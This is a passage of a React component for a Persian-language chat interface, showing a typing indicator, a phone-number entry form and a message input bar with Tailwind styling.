        {isTyping && (
          <div className="flex justify-start">
            <div className="bg-white/95 backdrop-blur-sm border border-gray-200/50 rounded-2xl px-4 py-3 shadow-lg">
              <div className="flex items-center space-x-1 space-x-reverse">
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.1s' }}></div>
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
                <span className="text-xs text-gray-500 mr-2">در حال تایپ...</span>
              </div>
            </div>
          </div>
        )}

        {showPhoneInput && (
          <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-2xl p-4 mx-2 mb-4">
            <h4 className="font-bold text-green-800 mb-3 text-center">شماره تماس خود را وارد کنید</h4>
            <div className="flex space-x-2 space-x-reverse">
              <input
                type="tel"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder="09123456789"
                className="flex-1 bg-white border border-green-300 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent text-center"
                maxLength={11}
              />
              <button
                onClick={handlePhoneSubmit}
                className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white px-6 py-3 rounded-xl font-semibold transition-all duration-300 whitespace-nowrap"
              >
                ارسال
              </button>
            </div>
          </div>
        )}

        <div ref={messagesEndRef} />
      </div>

      {/* Message Input - اصلاح شده برای سازگاری موبایل */}
      {!chatClosed && !showPhoneInput && (
        <div className="fixed bottom-16 left-0 right-0 bg-white/95 backdrop-blur-sm border-t border-gray-200/50 p-4 z-40">
          <div className="flex space-x-3 space-x-reverse max-w-4xl mx-auto">
            <input
              type="text"
              value={inputText}
              onChange={(e) => setInputText(e.target.value)}
              onKeyPress={handleKeyPress}
              placeholder="پیام خود را بنویسید..."
              className="flex-1 bg-gray-50 border border-gray-200 rounded-2xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              disabled={chatClosed}
            />
            <button
              onClick={() => sendMessage()}
              disabled={!inputText.trim() || chatClosed}
              className="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 disabled:from-gray-400 disabled:to-gray-500 text-white px-6 py-3 rounded-2xl font-semibold transition-all duration-300 whitespace-nowrap flex-shrink-0"
            >
              <i className="ri-send-plane-fill"></i>
            </button>
          </div>
        </div>
      )}

      <TabBar />
    </div>
  );
}
